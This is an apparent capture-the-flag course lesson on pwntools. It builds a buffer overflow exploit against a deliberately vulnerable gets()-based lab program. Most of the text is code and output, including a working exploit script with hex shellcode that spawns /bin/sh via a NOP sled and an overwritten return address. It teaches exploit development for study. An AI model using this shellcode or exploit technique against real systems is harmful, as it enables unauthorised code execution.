<h1 align="center">PWN 300</h1>
  <p align="center">
  Pwntools Introduction
  </p>

### Table of contents

- [Introduction](#introduction)
- [Starting Our Script](#starting-our-script)
- [Debugging Our Script](#debugging-our-script)
- [Finding The Offset](#finding-the-offset)
- [Reading The Address](#reading-the-address)
- [Scripting Buffer Overflows](#scripting-buffer-overflows)
- [More Resources](#more-resources)
- [Creators](#creators)

## Introduction

Pwntools is a library that allows exploit developers to script their exploits in a standard way. This allows us to create exploits that are easier to read, and it also enables us to write exploits that contain more complex logic. Pwntools can be installed by using `sudo pip3 install pwntools`. Make sure that you have it installed on your machine before proceeding because we will be scripting all of our exploits using pwntools from this point on.

## Starting Our Script

In our last buffer overflow, we had to use an extremely ugly Python one-liner on the command line to launch our attack. In this course, we'll go over how you can develop a much friendlier-looking exploit to conduct a buffer overflow on the program shown below.

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    char name[300];

    printf("Hello there!\n");
    printf("The buffer is at %p.\n", name);
    printf("Please enter your name: ");
    gets(name);

    return 0;
}
```

The vulnerability here is the fact that this program uses the `gets()` function to read user data. Not only is the `gets()` function deprecated, but it is also such a severe vulnerability that some compilers will outright refuse to compile the code. If you're dealing with such a compiler, then you may want to change the line to `fgets(name, 1000, stdin)`, which contains the same vulnerability.

```sh
$ gcc -o vuln -fno-stack-protector -z execstack vuln.c
vuln.c: In function ‘main’:
vuln.c:10:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   10 |     gets(name);
      |     ^~~~
      |     fgets
/usr/bin/ld: /tmp/ccrcevYU.o: in function `main':
vuln.c:(.text+0x60): warning: the `gets' function is dangerous and should not be used.

$ ./vuln
Hello there!
The buffer is at 0x7ffde226c230.
Please enter your name: Nihaal
```

The program tells us the location of the buffer, so we do not need to open up a debugger and figure it out ourselves. We can start exploiting this binary by creating a Python script that runs the program.

```python
#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./vuln", stdin=PTY)

# Print out the first line from the process
line = p.recvline()
print(line)

# Send our name to the program
p.sendline("Nihaal")

# Interact with the process
p.interactive()
```

There are a few things happening in this script. We first execute the program by creating a `process` called `p`. The `process` object in pwntools is an interface that allows us to send/receive data to a running program or see information about that program. One useful function provided by this interface is the `recvline()` function, which reads a single line from the process and returns it as a `bytes` object. The converse of this function is the `sendline()` function, which allows us to send data to the running process. The `interactive()` function is used to allow the person running the exploit to send data and receive data from their terminal screen (as opposed to it being done by the exploit behind the scenes).

```sh
$ ./exploit.py
[+] Starting local process './vuln': pid 2536
b'Hello there!\n'
[*] Switching to interactive mode
[*] Process './vuln' stopped with exit code 0 (pid 2536)
The buffer is at 0x7ffe422bb940.
Please enter your name: [*] Got EOF while reading in interactive
$
```

The lines starting with `[+]` or `[*]` are helpful comments that are automatically added by pwntools. These comments can give you helpful information about what is going on in your exploit while it is running, but you can ignore them for now.

When we run the exploit, we can see that the first line has been printed out as a `bytes` object (which is indicated by the "b" symbol). The other two lines are only printed out because we called `interactive()` almost immediately after printing out the first line, but if we did not make the call to `interactive()`, then those two extra lines would not have been printed out. The call to `interactive()` also automatically adds a shell prompt ($), but we are unable to type anything into the prompt.

The comment that states "[*] Got EOF while reading in interactive" tells you that pwntools has read all of the lines from the process. Usually if you see this message, then that means that your exploit is not working.

## Debugging Our Script

Most of the time during your exploit development process, you will find errors or get stuck somewhere. For this reason, pwntools is packed with debugging tools that can help you figure out what the problem is. We'll go over a couple of them right now in case you run into any issues.

```sh
$ ./exploit.py DEBUG
[+] Starting local process './vuln' argv=[b'./vuln'] : pid 2615
[DEBUG] Received 0xd bytes:
    b'Hello there!\n'
b'Hello there!\n'
[DEBUG] Sent 0x7 bytes:
    b'Nihaal\n'
[*] Switching to interactive mode
[*] Process './vuln' stopped with exit code 0 (pid 2615)
[DEBUG] Received 0x39 bytes:
    b'The buffer is at 0x7ffdf7af4f90.\n'
    b'Please enter your name: '
The buffer is at 0x7ffdf7af4f90.
Please enter your name: [*] Got EOF while reading in interactive
$
```

A tool that can be helpful while developing your exploit is the "DEBUG" argument. If you run your exploit with this argument, then pwntools will add messages that print out the exact bytes that your exploit is sending and receiving. This can be quite useful for debugging your exploit.

```sh
#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./vuln", stdin=PTY)
gdb.attach(p, 'b *main+106\ncontinue')

# Print out the first line from the process
line = p.recvline()
print(line)

# Send our name to the program
p.sendline("Nihaal")

# Interact with the process
p.interactive()
```

Another thing that we can do with pwntools is attach an instance of GDB to the process right after creating it. We can use the `gdb.attach()` function to debug the process that we're currently running. The second argument is optional, and it allows you to specify the specific commands that you want to execute in GDB. Each command should be separated by a "\n" character. When we run the code shown above, a second terminal window that contains an instance of GDB should pop up, and the code should hit a breakpoint on line `main+106`.

## Finding The Offset

Our next step in doing this buffer overflow is to figure out how many bytes are between the return address and the start of the buffer. By now, you should already know how to use the `cyclic` command to figure out the correct offset.

```sh
$ cyclic 500
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae

$ gdb vuln
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
77 commands loaded for GDB 10.1 using Python engine 3.9
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from vuln...
(No debugging symbols found in vuln)
gef➤  run
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 300/vuln
Hello there!
The buffer is at 0x7fffffffde90.
Please enter your name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae

Program received signal SIGSEGV, Segmentation fault.
0x00005555555551bf in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00007ffff7fad980  →  0x00000000fbad2288
$rdx   : 0x0
$rsp   : 0x00007fffffffdfc8  →  "daadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpa[...]"
$rbp   : 0x6461616364616162 ("baadcaad"?)
$rsi   : 0x00005555555596b1  →  "aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaa[...]"
$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
$rip   : 0x00005555555551bf  →  <main+106> ret
$r8    : 0x00007fffffffde90  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$r9    : 0x00007fffffffdee0  →  "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"
$r10   : 0x6e
$r11   : 0x00007fffffffe064  →  "raaesaaetaaeuaaevaaewaaexaaeyaae"
$r12   : 0x0000555555555070  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfc8│+0x0000: "daadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpa[...]"    ← $rsp
0x00007fffffffdfd0│+0x0008: "faadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadra[...]"
0x00007fffffffdfd8│+0x0010: "haadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadta[...]"
0x00007fffffffdfe0│+0x0018: "jaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadva[...]"
0x00007fffffffdfe8│+0x0020: "laadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxa[...]"
0x00007fffffffdff0│+0x0028: "naadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadza[...]"
0x00007fffffffdff8│+0x0030: "paadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaeca[...]"
0x00007fffffffe000│+0x0038: "raadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeea[...]"
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551b4 <main+95>        call   0x555555555050 <gets@plt>
   0x5555555551b9 <main+100>       mov    eax, 0x0
   0x5555555551be <main+105>       leave
 → 0x5555555551bf <main+106>       ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x5555555551bf in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551bf → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  quit

$ cyclic -l daad
312
```

Using the `cyclic` command, we see that we need 312 bytes to reach the return address. If we want to use pwntools to automate this process, we can use the following script.

```python
#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./vuln", stdin=PTY)

# Send cyclic pattern to find offset
p.sendline(cyclic(500))
p.wait()

# Dereference RSP and read four bytes from the stack
rsp = p.corefile.rsp # Get the value of RSP
print("RSP: " + hex(rsp))
pattern = p.corefile.read(rsp, 4)
print("RSP dereferenced: " + str(pattern))

# Calculate the offset
offset = cyclic_find(pattern)
print("Offset: " + str(offset))

# Interact with the process
p.interactive()
```

We call the `cyclic()` function to generate the pattern, and then we send the pattern to the program with a call to `sendline()`. This should crash the program, which should generate a [core file](https://linux.die.net/man/5/core). Information from the core file can be accessed from the `p.corefile` variable. The value of the stack pointer right when the crash occurred is stored under `p.corefile.rsp`, and we can read the next four bytes on the stack by calling `p.corefile.read(rsp, 4)`. Finally, we use `cyclic_find()` to calculate the offset itself.

```sh
$ ./exploit.py
[+] Starting local process './vuln': pid 1759
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 1759)
[+] Parsing corefile...: Done
[*] '/home/nihaal/Desktop/ctf-courses/Pwn/PWN 300/core.1759'
    Arch:      amd64-64-little
    RIP:       0x55bbb4a7b1bf
    RSP:       0x7ffe909f5c98
    Exe:       '/home/nihaal/Desktop/ctf-courses/Pwn/PWN 300/vuln' (0x55bbb4a7a000)
    Fault:     0x6461616564616164
RSP: 0x7ffe909f5c98
RSP dereferenced: b'daad'
Offset: 312
[*] Switching to interactive mode
Hello there!
The buffer is at 0x7ffe909f5b60.
Please enter your name: [*] Got EOF while reading in interactive
$
```

Upon running the script, we can see that pwntools came to the same conclusion: 312 is the offset.

## Reading The Address

Next, we need to know the address of the buffer. Luckily, this binary just prints out the address for us on the second line, so we don't need to lookup the address in GDB or disable ASLR. All we have to do is write some code to read the line, slice out the parts of the string that have nothing to do with the address, convert the hexadecimal string to an integer, and convert the integer into bytes stored in little endian format. This is all easy to do with pwntools.

```python
#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./vuln", stdin=PTY)

# Ignore the first line
p.readline()

# Get the address of the buffer
addr = str(p.recvline())
print("Second line: " + addr)
addr_start = addr.find('0x') # Address starts with '0x'
addr_end = addr.find('.') # Address ends with a period
addr = addr[addr_start:addr_end] # Cut off everything that is not part of the hexadecimal address
print("Sliced string: " + addr)
addr = int(addr, 16) # Convert hex address from string to int
addr = p64(addr) # Convert int to little endian format
print(addr)
```

First we read the second line from the binary by calling `p.recvline()` twice (we ignore the output from the first call). We know that the address starts with "0x" and ends with a period, so we can use python's built-in `find()` function to calculate the indices of the address, which allows us to easily slice the string on the next line. We can use the `int()` function to convert the address from a string to an `int`, and we can use pwntools' `p64()` function to switch the endianness of the bytes. Note that `p64()` only works for 64-bit addresses; if you're writing an exploit for a 32-bit binary, then you'll have to use `p32()` instead.

```python
$ ./exploit.py
[+] Starting local process './vuln': pid 1892
Second line: b'The buffer is at 0x7fff62475cf0.\n'
Sliced string: 0x7fff62475cf0
b'\xf0\\Gb\xff\x7f\x00\x00'
[*] Stopped process './vuln' (pid 1892)
```

Note that the other lines are not printed out because we did not call `interactive()` at the end of the script. 

When we run the program, we can see that the address of the buffer was printed out in little endian format. We now have all the information we need to conduct an actual buffer overflow attack.

## Scripting Buffer Overflows

```python
#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./vuln", stdin=PTY)

# Ignore the first line
p.readline()

# Get the address of the buffer
addr = p.recvline()
addr = str(addr) # Convert from bytes to string
addr_start = addr.find('0x') # Address starts with '0x'
addr_end = addr.find('.') # Address ends with a period
addr = addr[addr_start:addr_end] # Cut off everything that is not part of the hexadecimal address
addr = int(addr, 16) # Convert hex address from string to int
addr = p64(addr) # Convert int to little endian format

# Generate the payload
shellcode = b'\x66\x81\xec\x2c\x01\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05'
nopsled = b'\x90' * (312 - len(shellcode))
payload = nopsled + shellcode + addr

# Send the payload
p.sendline(payload)

# Allow us to type commands to the target
p.interactive()
```

Above is the script for our final exploit. The shellcode that is used here is the same shellcode that was used for our previous buffer overflow. Because our offset must be exactly 312 bytes, we must have `len(nopsled + shellcode)` be equal to 312, which is why `nopsled` is set equal to `b'\x90' * (312 - len(shellcode))`. When we run this script, we should get a working shell.

```sh
$ ./exploit.py
[+] Starting local process './vuln': pid 1942
[*] Switching to interactive mode
Please enter your name: $ $ ls
README.md  exploit.py  vuln  vuln.c  working.py
$ $ echo "Pwntools is the best library!"
Pwntools is the best library!
$ $
```

Note that sometimes pwntools has this annoying glitch where the shell icon ($) is printed out twice, but you can just ignore it if that happens to you. The buffer overflow works regardless.

## More Resources:
- [Pwntools Documentation](https://docs.pwntools.com/en/stable/index.html)

## Creators

**Nihaal Prasad**

Enjoy :metal:
